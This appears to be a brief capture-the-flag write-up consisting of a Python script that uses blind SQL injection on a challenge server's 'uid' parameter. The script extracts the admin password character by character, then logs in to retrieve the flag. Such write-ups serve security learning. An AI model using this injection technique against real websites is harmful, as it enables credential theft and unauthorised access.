# BlindSql-Writeup
<img width="897" height="359" alt="image" src="https://github.com/user-attachments/assets/812efe75-0798-4145-bf15-1a1eb88260fe" /> <br>
- Script xử lí <br>
```python
import requests
import string

URL = "http://103.97.125.56:30366"
charset = string.digits + string.ascii_letters + "_"
length = 13
password = ""
username = "admin"

def get_password_admin():
    global password
    for i in range(1, length + 1):
        for ch in charset:
            injection = f"{username}' AND (SELECT SUBSTR(upw,{i},1) FROM users WHERE uid='{username}')='{ch}'-- -"
            response = requests.get(f"{URL}/", params={"uid": injection})
            if "not found!" not in response.text:
                password += ch
                print(f"[+] Found {i}: {ch} -> {password}")
                break
    print(f"[✓] Done Password Admin: {password}")

def get_flag():
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(f"{URL}/login", data=data)
    if response.status_code == 200:
        print(f"[+] Done Login And Give Me Flag Heheh\n")
        print(response.text)
if __name__ == "__main__":
    get_password_admin()
    get_flag()

```
